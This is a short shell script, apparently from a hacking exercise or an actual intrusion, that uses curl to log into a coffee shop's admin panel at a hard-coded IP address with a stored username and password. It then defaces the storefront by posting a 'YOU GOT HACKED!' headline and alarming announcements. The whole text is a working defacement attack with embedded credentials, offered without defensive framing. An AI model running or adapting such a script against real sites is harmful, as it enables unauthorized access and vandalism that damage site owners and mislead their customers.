TARGET="http://20.42.115.173"
JAR=/tmp/coffee-cookies.txt

# 1. Log in as neil and save the session cookie
curl -s -c "$JAR" -b "$JAR" -o /dev/null -w "login: %{http_code}\n" \
  -d "username=neil&password=cappuccino" \
  "$TARGET/admin/login.php"

# 2. Submit the storefront form: new headline + red theme
curl -s -c "$JAR" -b "$JAR" -o /dev/null -w "deface: %{http_code}\n" \
  --data-urlencode "headline=YOU GOT HACKED!" \
  --data-urlencode "tagline=Your coffee has been decaffeinated." \
  --data-urlencode "announcement=SECURITY INCIDENT IN PROGRESS" \
  -d "theme=alert" \
  "$TARGET/admin/"
